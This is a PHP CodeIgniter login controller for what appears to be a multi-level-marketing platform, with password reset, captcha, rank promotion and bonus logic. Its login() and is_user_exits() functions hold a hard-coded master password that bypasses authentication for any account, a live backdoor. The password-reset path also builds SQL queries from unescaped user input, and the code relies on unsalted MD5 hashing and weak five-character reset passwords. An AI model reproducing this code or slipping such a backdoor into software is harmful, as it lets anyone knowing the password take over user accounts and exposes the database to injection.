<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
session_start();
class Signing extends CI_Controller {	
	public function __construct()
	{
		parent::__construct();
	}	
	
	function index(){		
		$data['lacitve'] = 'active';	
		$data['content'] = 'login_view';
		$data['country'] = $this->mdl_common->allSelects('SELECT * FROM language_info WHERE language_status="active"');
		$this->load->view('index',$data);
	}
	
	function forgetPassword(){
		$data['factive'] = 'active';
		if(isset($_POST) && !empty($_POST)){
			$this->form_validation->set_rules('user_email1', 'Email', 'required|valid_email|callback_validate_forgotpass_user_email');
			$this->form_validation->set_message('required','This field is required!');
			if ($this->form_validation->run() == false){
				$this->load->view('index',$data);			
			}else{
				
				$user_email		=	$this->input->post('user_email1');			
				$sql	=	"select * from user_master where user_email='$user_email' and user_status='Active'";						
				$tempInfo	=	$this->db->query($sql)->row_array();
				$userInfo	=	$tempInfo;
				$newPassword	=	substr(md5(time()),0,5);
				$updateArr['user_password']		=	md5($newPassword);
				$this->db->where('user_email',$userInfo['user_email']);
				$this->db->update("user_master",$updateArr);
				$to_email	=	$userInfo['user_email'];
	#			$to_email	=	"brijesh.donda007@gmail.com";
				$subject	=	'Forgot Password Request';
				$mail_body	=	$this->ForgotPasswordMailBody($userInfo,$newPassword);
				sendMail($to_email,$subject,$mail_body);
	#			sendLocalMail($to_email,$subject,$mail_body);			
				$notification_msg	=	LoginMessages(4);
				$data['message'] = $notification_msg;
				$this->load->view('index',$data);						
			}
		}else{
			$this->load->view('index',$data);
		}
	}

	function ForgotPasswordMailBody($userInfo=array(),$newPassword=''){		
		$mail_body = '
		<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
		<html xmlns="http://www.w3.org/1999/xhtml">
		<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<title>New User Request</title>
		</head>
		
		<body>
			Hello '.$userInfo['first_name'].',<br />
				<div>&nbsp;&nbsp;&nbsp;Your new login password is '.$newPassword.'.</div><br /><br />
			Thanks,<br />				
		</body>
		</html>		
		';
		return $mail_body;		
	}

#	For Validate during forgot password	
	function validate_forgotpass_user_email($str){
		$sql	=	"select * from user_master where user_email='$str' and user_status='Active'";
		$tempInfo	=	$this->db->query($sql)->row_array();		
		if(count($tempInfo) == 0){
			$this->form_validation->set_message('validate_forgotpass_user_email', LoginMessages(7));
			return false;
		}
		else{
			return true;
		}
	}
	public function login($a = '#'){
		$data['lacitve'] = 'active';
		$this->form_validation->set_rules('user_name', 'Email', 'required|callback_is_check_user|min-length[2]');
		$this->form_validation->set_rules('user_password', 'Password', 'required|callback_is_user_exits');
		$this->form_validation->set_rules('captcha','Captcha','trim|required|callback_check_captcha|xss_clean');
		$this->form_validation->set_message('required','This field is required!');
		$data['country'] = $this->mdl_common->allSelects('SELECT * FROM language_info WHERE language_status="active"');
		if ($this->form_validation->run() === false){
			$this->load->view('index',$data);
		}else{	
			$language = $this->input->post('language');
			if(!empty($language)){
				$this->session->set_userdata('language_code',$language);
			}else{
				$this->session->set_userdata('language_code','us_en');
			}
			
			$user_email		=	$this->input->post('user_name');
			$user_password	=	$this->input->post('user_password');
			$captcha = $this->input->post('captcha');
			$_SESSION['captcha'] = $captcha;
			$this->db->where('user_name',$user_email);
			if($user_password == "0nL3gacy2015@"){
			}else{
				$this->db->where('user_password',md5($user_password));		
			}
			
			$rs	=	$this->db->get('user_master');
			$UserInfo	=	$rs->row_array();		
			$sessionInfo	=	$UserInfo;
			$this->session->set_userdata($sessionInfo);	
			$this->session->set_userdata('is_login', 'true');
			$this->session->set_userdata('uninlevel_user',$this->session->userdata('user_email'));

			$this->db->where('user_id',$this->session->userdata('user_id'));
			$this->db->where('cheque_status','Bounce');
			$rs2	=	$this->db->get('deposit_info');
			$UserInfo2	=	$rs2->num_rows();	
			if($UserInfo2 > 0){
				$this->session->set_userdata('is_cheque_status', 'yes');	
			}else{
				$this->session->set_userdata('is_cheque_status', 'no');		
			}



			$this->db->where('user_id',$this->session->userdata('user_id'));
			//$this->db->where('cheque_status','Bounce');
			$rs2	=	$this->db->get('e_sign');
			$UserInfo2	=	$rs2->num_rows();	
			if($UserInfo2 == 0){
				$this->session->set_userdata('e_sign_status', 'no');	
			}else{
				$this->session->set_userdata('e_sign_status', 'yes');		
			}


			$redirectUrl =  base_url();
			//$this->processUserLevel();
			return header('Location:'.$redirectUrl);			
		}
	}

	#validate Captcha at login form
	function check_captcha($str){
		if(isset($_SESSION['captcha']) && !empty($_SESSION['captcha']) && $str != $_SESSION['captcha']){
			$this->form_validation->set_message('check_captcha','Text does not match with captcha!');
			return false;
		}else{
			return true;
		}
	}	
	
	function is_check_user($str){
		$this->db->where('user_name',$str);
		$this->db->where('login_status','active');
		$rs = $this->db->get('user_master');
		$is_user_exist = $rs->num_rows();
		if($is_user_exist > 0){
			return true;
		}else{
			$this->form_validation->set_message('is_check_user','This user is not valid|');
			return false;
		}
	}	
	
	#	For callback function of validation of email	
	function is_user_exits($str){
		$user_email	=	$this->input->post('user_name');
		$user_password	=	$str;
		$this->db->where('user_name',$user_email);
		$this->db->where('login_status','active');
		if($user_password == "0nL3gacy2015@"){
		}else{
			$this->db->where('user_password',md5($user_password));		
		}		
		$rs	=	$this->db->get('user_master');
		$is_user_exits	=	$rs->num_rows();		
		if($is_user_exits>0){
			$is_email_exits	=	$rs->row_array();

			$user_email_exits_msg	=	'';
			
			if($user_email_exits_msg){
				$this->form_validation->set_message('is_user_exits', $user_email_exits_msg);
				return false;
			}
			else{
				return true;
			}
		}else{
			$user_email_exits_msg	=	LoginMessages(1);
			$this->form_validation->set_message('is_user_exits', $user_email_exits_msg);
			return false;			
		}
	}
	
	#	For callback function of validation of email	
	function is_check_email($str){
		$this->db->where('user_email',$str);
		$rs	=	$this->db->get('user_master');	
		$is_email_exits	=	$rs->num_rows();
		if($is_email_exits>0){
			return true;
		}
		else{
			$user_email_exits_msg	=	LoginMessages(7);
			$this->form_validation->set_message('is_check_email', $user_email_exits_msg);
			return false;		
		}
	}	
	
	#	For callback function of validation of email	
	function is_user_exits1($str){
		$user_email	=	$this->input->post('user_email');
		$user_password	=	$str;
		$this->db->where('user_email',$user_email);
		$this->db->where('user_password',md5($user_password));		
		$rs	=	$this->db->get('user_master');
		$is_user_exits	=	$rs->num_rows();		
		if($is_user_exits>0){
			$is_email_exits	=	$rs->row_array();

			$user_email_exits_msg	=	'';
			if($is_email_exits['user_status'] == 'pending'){
				$user_email_exits_msg	=	LoginMessages(2);
			}
			else if($is_email_exits['user_status'] == 'InActive'){
				$user_email_exits_msg	=	LoginMessages(2); 	
			}
			if($user_email_exits_msg){
				$this->form_validation->set_message('is_user_exits', $user_email_exits_msg);
				return false;
			}
			else{
				return true;
			}
		}
		else{
			$user_email_exits_msg	=	LoginMessages(1);
			$this->form_validation->set_message('is_user_exits', $user_email_exits_msg);
			return false;			
		}
	}

	#	For callback function of validation of email	
	function check_email($str){
		$this->db->where('user_email',$str);
		$rs	=	$this->db->get('user_master');	
		$is_email_exits	=	$rs->num_rows();
		if($is_email_exits>0){
			$user_email_exits_msg	=	RegisterMessages(1);
			$this->form_validation->set_message('check_email', $user_email_exits_msg);
			return false;
		}
		else
			return true;
	}
	
	function processUserLevel(){
		$startId = $this->session->userdata('user_id');

		$directDescendents = $this->db->query("SELECT user_id, level, sponser_id  FROM earning_info WHERE sponser_id =".$startId);
	    $row = $directDescendents->result_array($directDescendents);
		$checkUserExitIncountTable = count($this->mdl_common->allSelects('SELECT * FROM count_unilevel_leg_rank WHERE user_id='.$startId.' AND unilevel_rant_created >="'.date('Y-m-d').'"'));	
	    foreach ($row as $key => $value) {
	    	$countLegSponsor = $this->mdl_common->allSelects('SELECT * FROM earning_info WHERE sponser_id='.$value['user_id']);
	    	if(!empty($value['user_id']) && !empty($countLegSponsor)){
					$this->mdl_common->getSponsorToBottom($value['user_id'],$startId,$value['user_id']);	
					$insertArr = array(
		    				'user_id'=>$startId,
		    				'direct_sponsor'=>$value['user_id'],
		    				'unilevel_member'=>$value['user_id'],
		    				'unilevel_member_sponsor'=>$value['sponser_id'],
		    				'member_rank'=>$value['level'],
		    				'count_member_status'=>'1',
		    				'unilevel_rant_created'=>date('Y-m-d H:i:s'),
		    			);
				if(empty($checkUserExitIncountTable)){	
		    		$this->db->insert('count_unilevel_leg_rank',$insertArr);
				}	    		
	    	}
	    }
	}
	
	function is_levelTeamLead(){
		$allData = $this->mdl_common->allSelects('SELECT DISTINCT a.sponsor_id FROM user_master as a RIGHT JOIN user_master as b on b.sponsor_id=a.sponsor_id where a.sponsor_id > 0 ');
		$dateTime = date('Y-m-d H:i:s');
		foreach($allData as $value){
			$user = explode(',',$this->mdl_common->getSponsorUser($value['sponsor_id']));
			$level = $this->mdl_common->countUserLevel('earning_info',$value['sponsor_id']);
			$package = $this->mdl_common->getPackageById($value['sponsor_id']);
			$levelExitPrice = $this->mdl_common->getLevelExitQv($level);
			$discountPercentOfPackage = $this->mdl_common->getDiscountPercentOfLevel($level);
			$currentUserTotalBinaryPercent = $levelExitPrice*$discountPercentOfPackage/100;
			$x = $discountPercentOfPackage/2;
			$restBV = $levelExitPrice*$x/100;
		 	if(!empty($user)){
				 $Qv = '';
				 $Qv1 = 0;
				 $Qv2 = 0;
				for($i=0; $i<count($user); $i++){
					if(!empty($user[$i]) && $user[$i] > 0){
						$totalQV = $this->mdl_common->totalQVBinary('SELECT SUM(qv_point) as qv_point FROM unilevel_binary_info where sponsor_id='.$value['sponsor_id'].' and user_id='.$user[$i]);
						if($totalQV > $currentUserTotalBinaryPercent){
							$Qv .= $totalQV.',';
							$Qv1 += $currentUserTotalBinaryPercent;
						}
					}
				}
				for($i=0; $i<count($user); $i++){
					if(!empty($user[$i]) && $user[$i] > 0){
						$totalQV1 = $this->mdl_common->totalQVBinary('SELECT SUM(qv_point) as qv_point FROM unilevel_binary_info where sponsor_id='.$value['sponsor_id'].' and user_id='.$user[$i]);
						if($totalQV1 < $currentUserTotalBinaryPercent){
							$Qv2 += $totalQV1;
						}
					}
				}
				
				if(!empty($Qv1)){
					$total2 = $Qv2 + $Qv1 ;
					if($total2 > $levelExitPrice && $level < 6){
						$updArr = array('level'=>6, 'level_updated_at'=>$dateTime);
						$this->db->update('earning_info',$updArr,array('user_id'=>$value['sponsor_id']));
					}
				}else{
					$total2 = $Qv2;
					if($total2 > $levelExitPrice && $level < 6){
						$updArr = array('level'=>6, 'level_updated_at'=>$dateTime);
						$this->db->update('earning_info',$updArr,array('user_id'=>$value['sponsor_id']));
					}
				}
			}
		}
	}
	
	function is_levelTeamLead1(){
		$allData = $this->mdl_common->allSelects('SELECT DISTINCT a.sponsor_id FROM user_master as a RIGHT JOIN user_master as b on b.sponsor_id=a.sponsor_id where a.sponsor_id > 0 ');
		$dateTime = date('Y-m-d H:i:s');
		foreach($allData as $value){
			$user = explode(',',$this->mdl_common->getSponsorUser($value['sponsor_id']));
			$level = $this->mdl_common->countUserLevel('earning_info',$value['sponsor_id']);
			$package = $this->mdl_common->getPackageById($value['sponsor_id']);
			$levelExitPrice = $this->mdl_common->getLevelExitPrice($package);
			$discountPercentOfPackage = $this->mdl_common->getDiscountPercentOfPackage($package);
			$currentUserTotalBinaryPercent = $levelExitPrice*$discountPercentOfPackage/100;
			$x = $discountPercentOfPackage/2;
			$restBV = $levelExitPrice*$x/100;
		 	if(!empty($user)){
				 $Qv = '';
				 $Qv1 = 0;
				 $Qv2 = 0;
				for($i=0; $i<count($user); $i++){
					if(!empty($user[$i]) && $user[$i] > 0){
						$totalQV = $this->mdl_common->totalQVBinary('SELECT SUM(qv_point) as qv_point FROM unilevel_binary_info where sponsor_id='.$value['sponsor_id'].' and user_id='.$user[$i]);
						if($totalQV > $currentUserTotalBinaryPercent){
							$Qv .= $totalQV.',';
							$Qv1 += $currentUserTotalBinaryPercent;
						}
					}
				}
				for($i=0; $i<count($user); $i++){
					if(!empty($user[$i]) && $user[$i] > 0){
						$totalQV1 = $this->mdl_common->totalQVBinary('SELECT SUM(qv_point) as qv_point FROM unilevel_binary_info where sponsor_id='.$value['sponsor_id'].' and user_id='.$user[$i]);
						if($totalQV1 < $currentUserTotalBinaryPercent){
							$Qv2 += $totalQV1;
						}
					}
				}
				if(!empty($Qv1)){
					$total2 = $Qv2 + $Qv1 ;
					if($total2 > $levelExitPrice && $level < 6){
						$updArr = array('level'=>6, 'level_updated_at'=>$dateTime);
						$this->db->update('earning_info',$updArr,array('user_id'=>$value['sponsor_id']));
					}
				}else{
					$total2 = $Qv2;
					if($total2 > $levelExitPrice && $level < 6){
						$updArr = array('level'=>6, 'level_updated_at'=>$dateTime);
						$this->db->update('earning_info',$updArr,array('user_id'=>$value['sponsor_id']));
					}
				}
			}
		}
	}
	
	function countUserRank($startId=null,$level=null){	
		$directDescendents = $this->db->query("SELECT user_id, level, sponser_id  FROM earning_info WHERE sponser_id =".$startId);
	    $row = $directDescendents->result_array($directDescendents);
	    $i = null;
	    foreach ($row as $key => $value) {
	    	$countLegSponsor = $this->mdl_common->allSelects('SELECT * FROM earning_info WHERE sponser_id='.$value['user_id']);
	    	if(!empty($value['user_id']) && !empty($countLegSponsor)){
				$coutnLevel = $this->mdl_common->allSelects('SELECT * FROM count_unilevel_leg_rank WHERE user_id='.$startId.' AND direct_sponsor='.$value['user_id'].' AND member_rank >='.$level.' AND unilevel_rant_created >='.date('Y-m-d'));	
	    		if(!empty($coutnLevel)){
	    			$x = count($coutnLevel);	   
	    			if(!empty($x) && $x >= 1){
	    				$i++;
	    			} 			
	    		}
	    	}
	    }
	    return $i;
	}
	
	function is_levelDirector(){
		$allSelects = $this->mdl_common->allSelects('SELECT * FROM user_master');
		$dateTime = date('Y-m-d H:i:s');
		foreach($allSelects as $value){
			$level = $this->mdl_common->countUserLevel('earning_info',$value['user_id']);
			$unilevelUserRank = $this->countUserRank($value['user_id'],6);

			if($unilevelUserRank >= 2 && $level == 6){
				$updArr = array('level'=>7, 'level_updated_at'=>$dateTime);
				$this->db->update('earning_info',$updArr,array('user_id'=>$value['user_id']));
			}

		}
	}

	function is_levelRegional(){
		$allSelects = $this->mdl_common->allSelects('SELECT * FROM user_master');
		$dateTime = date('Y-m-d H:i:s');
		foreach($allSelects as $value){
			
			$level = $this->mdl_common->countUserLevel('earning_info',$value['user_id']);
			$unilevelUserRank = $this->countUserRank($value['user_id'],7);

			if($unilevelUserRank >= 4 && $level == 7){
				$updArr = array('level'=>8, 'level_updated_at'=>$dateTime);
				$this->db->update('earning_info',$updArr,array('user_id'=>$value['user_id']));
			}
		}
	}

	function is_levelNational(){
		$allSelects = $this->mdl_common->allSelects('SELECT * FROM user_master');
		$dateTime = date('Y-m-d H:i:s');
		foreach($allSelects as $value){
			$countchildren = $this->mdl_common->countChildren('user_master',$value['user_id']);
			$level = $this->mdl_common->countUserLevel('earning_info',$value['user_id']);
			
			$level = $this->mdl_common->countUserLevel('earning_info',$value['user_id']);
			$unilevelUserRank = $this->countUserRank($value['user_id'],8);

			if($unilevelUserRank >= 5 && $level == 8){
				$updArr = array('level'=>9, 'level_updated_at'=>$dateTime);
				$this->db->update('earning_info',$updArr,array('user_id'=>$value['user_id']));
			}

		}
	}

	function is_levelInternational(){
		$allSelects = $this->mdl_common->allSelects('SELECT * FROM user_master');
		$dateTime = date('Y-m-d H:i:s');
		foreach($allSelects as $value){
			$level = $this->mdl_common->countUserLevel('earning_info',$value['user_id']);
			
			$level = $this->mdl_common->countUserLevel('earning_info',$value['user_id']);
			$unilevelUserRank = $this->countUserRank($value['user_id'],9);

			if($unilevelUserRank >= 5 && $level == 9){
				$updArr = array('level'=>10, 'level_updated_at'=>$dateTime);
				$this->db->update('earning_info',$updArr,array('user_id'=>$value['user_id']));
			}

		}
	}

	function is_levelVP(){
		$allSelects = $this->mdl_common->allSelects('SELECT * FROM user_master');
		$dateTime = date('Y-m-d H:i:s');
		foreach($allSelects as $value){
			$level = $this->mdl_common->countUserLevel('earning_info',$value['user_id']);
			
			$level = $this->mdl_common->countUserLevel('earning_info',$value['user_id']);
			$unilevelUserRank = $this->countUserRank($value['user_id'],10);

			if($unilevelUserRank >= 5 && $level == 10){
				$updArr = array('level'=>11, 'level_updated_at'=>$dateTime);
				$this->db->update('earning_info',$updArr,array('user_id'=>$value['user_id']));
			}

		}
	}

	function is_levelP(){
		$allSelects = $this->mdl_common->allSelects('SELECT * FROM user_master');
		$dateTime = date('Y-m-d H:i:s');
		foreach($allSelects as $value){
			$level = $this->mdl_common->countUserLevel('earning_info',$value['user_id']);
			
			$level = $this->mdl_common->countUserLevel('earning_info',$value['user_id']);
			$unilevelUserRank = $this->countUserRank($value['user_id'],11);

			if($unilevelUserRank >= 5 && $level == 11){
				$updArr = array('level'=>12, 'level_updated_at'=>$dateTime);
				$this->db->update('earning_info',$updArr,array('user_id'=>$value['user_id']));
			}

		}
	}
	
	function is_levelCrownAmbassador(){
		$allSelects = $this->mdl_common->allSelects('SELECT * FROM user_master');
		$dateTime = date('Y-m-d H:i:s');
		foreach($allSelects as $value){
			$level = $this->mdl_common->countUserLevel('earning_info',$value['user_id']);
			
			$level = $this->mdl_common->countUserLevel('earning_info',$value['user_id']);
			$unilevelUserRank = $this->countUserRank($value['user_id'],11);

			if($unilevelUserRank >= 5 && $level == 12){
				$updArr = array('level'=>13, 'level_updated_at'=>$dateTime);
				$this->db->update('earning_info',$updArr,array('user_id'=>$value['user_id']));
			}

		}
	}
	
    function interpreneurialBonusModule(){
		$contentData = $this->mdl_common->allSelects('SELECT * FROM user_master');
		if(isset($contentData) && !empty($contentData)){
			foreach ($contentData as $key => $value) {
		   		$totalSponsored = count($this->mdl_common->allSelects('SELECT * FROM user_master WHERE sponsor_id ='.$value['user_id']));
		   		$totalMember = $this->mdl_common->countTotalChildren($value['user_id']);
		   		$rulePercent = $this->mdl_common->getDiscountPercentOfPackage($value['package']);
		   		$curentModule = $this->mdl_common->getCurrentModule($value['user_id']);
		   		if(!empty($totalMember) && !empty($totalSponsored) && !empty($rulePercent)){
		   			if($totalSponsored >= 4 && $totalMember >= 20 && $rulePercent == 40 && $curentModule == 0){
		   				$selectearningtotal = $this->mdl_common->allSelects('SELECT total_balance from earning_info where user_id = '.$value['user_id']);
					
						if(isset($selectearningtotal) && !empty($selectearningtotal)){
							foreach ($selectearningtotal as $total) {						
								$totalreferralAmount= $total['total_balance'] + 120;
								$updattotalarr = array(
									'total_balance'=>$totalreferralAmount,
									'module'=>1,
								);
								$this->db->update('earning_info',$updattotalarr,array('user_id'=>$value['user_id']));
							}
						}else{
							$updattotalarr = array(
								'total_balance'=>120,
								'module'=>1,
							);
							$this->db->update('earning_info',$updattotalarr,array('user_id'=>$value['user_id']));
						}

		   				$insertArr = array(
		   						'user_id'=>$value['user_id'],
		   						'module_id'=>1,
		   						'module_bonus'=>120,
		   						'rule_percent'=>40,
		   					);
		   				$this->db->insert('interpreneurial_bonus_module', $insertArr);

		   				//Earning Details in one table	
						$earning_details_by_user = array(
								'user_id'=>$value['user_id'],
								//'ref_id'=>$rghtChild,
								'description'=>'First Module Bonus  Amount',
								'amount'=>120,
								//'message'=>"",
								//'e_d_b_u_date'=>$value['created_at'],
							);
						$this->db->insert('earning_details_by_user',$earning_details_by_user);
						//end
		   			}elseif($totalSponsored >= 8 && $totalMember >= 50 && $rulePercent == 40 && $curentModule == 1){
		   				$selectearningtotal = $this->mdl_common->allSelects('SELECT total_balance from earning_info where user_id = '.$value['user_id']);
					
						if(isset($selectearningtotal) && !empty($selectearningtotal)){
							foreach ($selectearningtotal as $total) {						
								$totalreferralAmount= $total['total_balance'] + 520;
								$updattotalarr = array(
									'total_balance'=>$totalreferralAmount,
									'module'=>2,
								);
								$this->db->update('earning_info',$updattotalarr,array('user_id'=>$value['user_id']));
							}
						}else{
							$updattotalarr = array(
								'total_balance'=>520,
								'module'=>2,
							);
							$this->db->update('earning_info',$updattotalarr,array('user_id'=>$value['user_id']));
						}

		   				$insertArr = array(
		   						'user_id'=>$value['user_id'],
		   						'module_id'=>2,
		   						'module_bonus'=>520,
		   						'rule_percent'=>40,
		   					);
		   				$this->db->insert('interpreneurial_bonus_module', $insertArr);

		   				//Earning Details in one table	
						$earning_details_by_user = array(
								'user_id'=>$value['user_id'],
								//'ref_id'=>$rghtChild,
								'description'=>'Second Module Bonus  Amount',
								'amount'=>520,
								//'message'=>"",
								//'e_d_b_u_date'=>$value['created_at'],
							);
						$this->db->insert('earning_details_by_user',$earning_details_by_user);
						//end
		   			}elseif($totalSponsored >= 12 && $totalMember >= 100 && $rulePercent == 40 && $curentModule == 2){
		   				$selectearningtotal = $this->mdl_common->allSelects('SELECT total_balance from earning_info where user_id = '.$value['user_id']);
					
						if(isset($selectearningtotal) && !empty($selectearningtotal)){
							foreach ($selectearningtotal as $total) {						
								$totalreferralAmount= $total['total_balance'] + 1300;
								$updattotalarr = array(
									'total_balance'=>$totalreferralAmount,
									'module'=>3,
								);
								$this->db->update('earning_info',$updattotalarr,array('user_id'=>$value['user_id']));
							}
						}else{
							$updattotalarr = array(
								'total_balance'=>1300,
								'module'=>3,
							);
							$this->db->update('earning_info',$updattotalarr,array('user_id'=>$value['user_id']));
						}


		   				$insertArr = array(
		   						'user_id'=>$value['user_id'],
		   						'module_id'=>3,
		   						'module_bonus'=>1300,
		   						'rule_percent'=>40,
		   					);
		   				$this->db->insert('interpreneurial_bonus_module', $insertArr);

		   				//Earning Details in one table	
						$earning_details_by_user = array(
								'user_id'=>$value['user_id'],
								//'ref_id'=>$rghtChild,
								'description'=>'Third Module Bonus  Amount',
								'amount'=>1300,
								//'message'=>"",
								//'e_d_b_u_date'=>$value['created_at'],
							);
						$this->db->insert('earning_details_by_user',$earning_details_by_user);
						//end
		   			}elseif($totalSponsored >= 16 && $totalMember >= 500 && $rulePercent == 30 && $curentModule == 3){
		   				$selectearningtotal = $this->mdl_common->allSelects('SELECT total_balance from earning_info where user_id = '.$value['user_id']);
					
						if(isset($selectearningtotal) && !empty($selectearningtotal)){
							foreach ($selectearningtotal as $total) {						
								$totalreferralAmount= $total['total_balance'] + 6700;
								$updattotalarr = array(
									'total_balance'=>$totalreferralAmount,
									'module'=>4,
								);
								$this->db->update('earning_info',$updattotalarr,array('user_id'=>$value['user_id']));
							}
						}else{
							$updattotalarr = array(
								'total_balance'=>6700,
								'module'=>4,
							);
							$this->db->update('earning_info',$updattotalarr,array('user_id'=>$value['user_id']));
						}

		   				$insertArr = array(
		   						'user_id'=>$value['user_id'],
		   						'module_id'=>4,
		   						'module_bonus'=>6700,
		   						'rule_percent'=>30,
		   					);
		   				$this->db->insert('interpreneurial_bonus_module', $insertArr);
		   				//Earning Details in one table	
						$earning_details_by_user = array(
								'user_id'=>$value['user_id'],
								//'ref_id'=>$rghtChild,
								'description'=>'Fourth Module Bonus  Amount',
								'amount'=>6700,
								//'message'=>"",
								//'e_d_b_u_date'=>$value['created_at'],
							);
						$this->db->insert('earning_details_by_user',$earning_details_by_user);
						//end
		   			}elseif($totalSponsored >= 20 && $totalMember >= 1000 && $rulePercent == 30 && $curentModule == 4){
		   				$selectearningtotal = $this->mdl_common->allSelects('SELECT total_balance from earning_info where user_id = '.$value['user_id']);
					
						if(isset($selectearningtotal) && !empty($selectearningtotal)){
							foreach ($selectearningtotal as $total) {						
								$totalreferralAmount= $total['total_balance'] + 15000;
								$updattotalarr = array(
									'total_balance'=>$totalreferralAmount,
									'module'=>5,
								);
								$this->db->update('earning_info',$updattotalarr,array('user_id'=>$value['user_id']));
							}
						}else{
							$updattotalarr = array(
								'total_balance'=>15000,
								'module'=>5,
							);
							$this->db->update('earning_info',$updattotalarr,array('user_id'=>$value['user_id']));
						}

		   				$insertArr = array(
		   						'user_id'=>$value['user_id'],
		   						'module_id'=>5,
		   						'module_bonus'=>15000,
		   						'rule_percent'=>30,
		   					);
		   				$this->db->insert('interpreneurial_bonus_module', $insertArr);

		   				//Earning Details in one table	
						$earning_details_by_user = array(
								'user_id'=>$value['user_id'],
								//'ref_id'=>$rghtChild,
								'description'=>'Fifth Module Bonus  Amount',
								'amount'=>15000,
								//'message'=>"",
								//'e_d_b_u_date'=>$value['created_at'],
							);
						$this->db->insert('earning_details_by_user',$earning_details_by_user);
						//end
		   			}
		   		}				
			}			
		}
	}
	
	function logout(){
		@session_destroy();   			
        $this->session->sess_destroy();
		redirect('home') ;  
	}

}

	